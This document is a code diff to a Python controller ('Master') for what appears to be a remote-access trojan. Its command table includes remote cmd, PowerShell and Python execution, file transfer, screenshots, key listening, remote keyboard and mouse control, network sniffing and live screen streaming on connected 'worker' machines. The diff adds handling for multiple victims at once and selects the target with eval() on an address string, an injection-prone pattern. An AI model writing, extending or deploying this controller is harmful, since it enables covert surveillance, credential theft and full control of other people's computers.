@@ -157,28 +157,32 @@ def save_file(received:bytes):
 
 class Master:
     def __init__(self, ip:str, port:int):
-        self.address = (ip,port)
         self.server = socket.socket()
         self.server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        self.server.bind(self.address)
+        self.server.bind((ip,port))
         self.stream_server = socket.socket()
         self.stream_server.bind((ip,port+1))
         self.server.listen()
         self.stream_server.listen()
-        self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
         self.exit:bool = False
-
+        self.address = None
         self._sock_lock = threading.RLock()
         self.on_stream_stop = None
         self.streaming = False
         self.control_key = False
         self.control_mouse = False
+        self.update_clients = None
+        self.clients:dict[(str,int),(socket.socket,socket.socket)] = {}
+
 
     def connect(self):
-        self.client = self.server.accept()[0]
-        print(self.client.recv(1024).decode())
-        self.stream_client = self.stream_server.accept()[0]
+        while True:
+            client, address = self.server.accept()
+            print(client.recv(1024).decode())
+            stream_client = self.stream_server.accept()[0]
+            self.clients[address] = (client,stream_client)
+            self.update_clients()
 
     def recvall(self, sock: socket.socket, size: int) -> bytes:
         data = b""
@@ -206,7 +210,7 @@ class Master:
         def send_payload(payload: dict):
             data = json.dumps(payload).encode()
             with self._sock_lock:
-                self.sender(self.client, b"control_mouse:" + data)
+                self.sender(self.clients[eval(self.address)][0], b"control_mouse:" + data)
 
         def listen(event):
             if not self.control_mouse:
@@ -220,7 +224,9 @@ class Master:
                 send_payload(payload)
                 return
             else:
-                payload = {"type": "move_abs", "x": event.x, "y": event.y}
+                if event.y<22 and self.streaming:
+                    return
+                payload = {"type": "move_abs", "x": event.x, "y": event.y-22}
                 send_payload(payload)
 
         mouse.hook(listen)
@@ -233,7 +239,7 @@ class Master:
             if self.control_key:
                 event = keyboard.read_event()
                 with self._sock_lock:
-                    self.sender(self.client,b"press_key_in_worker:" + event.event_type.encode() + b":" + event.name.encode())
+                    self.sender(self.clients[eval(self.address)][0],b"press_key_in_worker:" + event.event_type.encode() + b":" + event.name.encode())
 
             else:
                 time.sleep(0.1)
@@ -247,8 +253,8 @@ class Master:
         while True:
             if self.streaming:
 
-                self.sender(self.client, b"live_stream")
-                frame_data = self.receiver(self.stream_client)
+                self.sender(self.clients[eval(self.address)][0], b"live_stream")
+                frame_data = self.receiver(self.clients[eval(self.address)][1])
 
                 if not frame_data:
                     time.sleep(0.05)
@@ -313,9 +319,12 @@ class Master:
 
     def run2(self,function:str, message:bytes) -> bytes:
         if function == "quit":
-            self.sender(self.client,"quit".encode())
+            with self._sock_lock:
+                self.sender(self.clients[eval(self.address)][0],"quit".encode())
             self.server.close()
-            self.client.close()
+            self.stream_server.close()
+            self.clients[eval(self.address)][0].close()
+            self.clients[eval(self.address)][1].close()
             return "exited the worker".encode()
         if function == "send_file":
             splitted = message.decode().split(":")
@@ -323,8 +332,8 @@ class Master:
         if b"error:" in message:
             return message
         with self._sock_lock:
-            self.sender(self.client, function.encode() + b":" + message)
-            received = self.receiver(self.client)
+            self.sender(self.clients[eval(self.address)][0], function.encode() + b":" + message)
+            received = self.receiver(self.clients[eval(self.address)][0])
         return received
 
     def run1(self):
